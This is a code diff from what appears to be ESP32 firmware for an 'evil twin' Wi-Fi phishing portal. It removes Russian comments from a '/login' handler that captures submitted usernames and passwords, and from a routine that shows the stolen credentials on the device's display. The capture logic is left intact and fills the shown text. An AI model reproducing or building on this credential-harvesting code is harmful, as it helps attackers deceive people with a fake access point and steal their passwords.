@@ -143,7 +143,7 @@ server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request){
         String username = request->getParam("username", true)->value();
         String pass = request->getParam("password", true)->value();
         
-        // Используем символ "|" как разделитель
+        
         capturedCredentials = username + "|" + pass;
         
         request->send(200, "text/html", 
@@ -190,22 +190,19 @@ void displayEvilTwinStatus() {
     display.println("----------------");
     
     if (capturedCredentials != "") {
-      // Новый надежный метод обработки
+      
       String username = "";
       String password = "";
       
-      // Ищем разделитель между логином и паролем
       int dividerPos = capturedCredentials.indexOf("|");
       
       if(dividerPos != -1) {
-        // Разделяем строку на две части
         username = capturedCredentials.substring(0, dividerPos);
         password = capturedCredentials.substring(dividerPos + 1);
         
         display.println("User: " + username);
         display.println("Pass: " + password);
       } else {
-        // Если разделитель не найден, выводим как есть
         display.println("Received:");
         display.println(capturedCredentials);
       }
